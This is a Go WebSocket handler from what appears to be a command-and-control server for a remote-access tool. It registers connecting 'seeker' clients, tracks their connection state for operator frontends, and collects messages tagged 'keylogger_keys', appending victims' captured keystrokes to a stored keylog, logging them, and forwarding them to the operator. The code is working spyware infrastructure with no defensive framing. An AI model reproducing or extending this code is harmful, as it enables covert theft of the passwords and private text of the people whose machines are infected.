package handlers

import (
	"argus/backend/models"
	"argus/backend/utils"
	"log"
	"net/http"
	"time"
)

func SeekerWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Seeker WebSocket upgrade failed:", err)
		return
	}
	defer conn.Close()

	var initData models.Seeker
	if err := conn.ReadJSON(&initData); err != nil {
		log.Println("Failed to read initial seeker data:", err)
		return
	}

	initData.Conn = conn

	seekersLock.Lock()
	existing, alreadyConnected := seekers[initData.ID]
	if alreadyConnected {
		existing.Conn = conn
		existing.Disconnected = false
		existing.LastActive = time.Now()
	} else {
		initData.LastActive = time.Now()
		seekers[initData.ID] = &initData
	}
	seekersLock.Unlock()

	if alreadyConnected {
		broadcastToFrontends(models.Message{
			Type: "SeekerReconnected",
			Data: initData.ID,
		})
	} else {
		broadcastToFrontends(models.Message{
			Type: "SeekerConnected",
			Data: initData.ID,
		})
	}

	if err := conn.WriteJSON(map[string]string{"id": initData.ID}); err != nil {
		log.Println("Failed to send ID to seeker:", err)
		utils.RemoveFromMap(seekers, initData.ID, &seekersLock)
		return
	}

	log.Printf("Seeker connected: %s (%s)", initData.Name, initData.ID)

	notifySeekerConnected(initData.ID)

	broadcastSeekerList()

	for {
		var msg models.Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Println("Seeker WebSocket read error:", err)

			seekersLock.Lock()
			seeker, ok := seekers[initData.ID]
			if ok && seeker != nil {
				if seeker.Conn == conn {
					seeker.Disconnected = true
					seeker.Conn = nil
				}
			} else {
				log.Printf("Seeker with ID %s not found during WebSocket cleanup", initData.ID)
			}
			seekersLock.Unlock()

			notifySeekerDisconnected(initData.ID)
			broadcastSeekerList()

			return
		}

		seekersLock.Lock()
		if seeker, exists := seekers[initData.ID]; exists {
			seeker.LastActive = time.Now()

			if msg.Type == "keylogger_keys" {
				if keyData, ok := msg.Data.(string); ok {
					seeker.Keylogs += keyData
					log.Printf("Keylogs updated for seeker %s: %s", initData.ID, keyData)
				} else {
					log.Printf("Invalid keylogger data format for seeker %s", initData.ID)
				}
			}
		}
		seekersLock.Unlock()

		log.Printf("Received from seeker %s: %v", initData.ID, msg)

		sendToFrontend(initData.ID, msg)
	}
}
